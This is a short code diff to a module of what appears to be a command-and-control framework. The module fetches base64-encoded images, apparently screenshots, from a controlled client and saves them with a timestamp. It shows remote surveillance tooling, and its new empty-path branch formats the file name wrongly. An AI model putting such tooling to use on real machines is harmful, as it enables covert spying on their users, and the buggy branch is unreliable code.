@@ -68,7 +68,7 @@ class Module(BaseModule):
         if len(command_parsed) > 2:
             image_path = command.split(' ')[2]
         else:
-            image_path = '.'
+            image_path = ''
 
         client_id = self.c2_manager.get_client_id_by_client_name(client_id_or_name)
 
@@ -111,8 +111,10 @@ class Module(BaseModule):
 
                     if recv_parts > int(response['of']):
                         break
-
-            image_name = '{}/{}_{}.jpg'.format(image_path, client_id_or_name, time.strftime("%Y-%m-%d_%H.%M.%S"))
+            if image_path == '':
+                image_name = '{}_{}.jpg'.format(image_path, client_id_or_name, time.strftime("%Y-%m-%d_%H.%M.%S"))
+            else:
+                image_name = '{}/{}_{}.jpg'.format(image_path, client_id_or_name, time.strftime("%Y-%m-%d_%H.%M.%S"))
             with open(image_name, 'wb') as image_file:
                 image_file.write(base64.b64decode(b64_image.encode()))
 
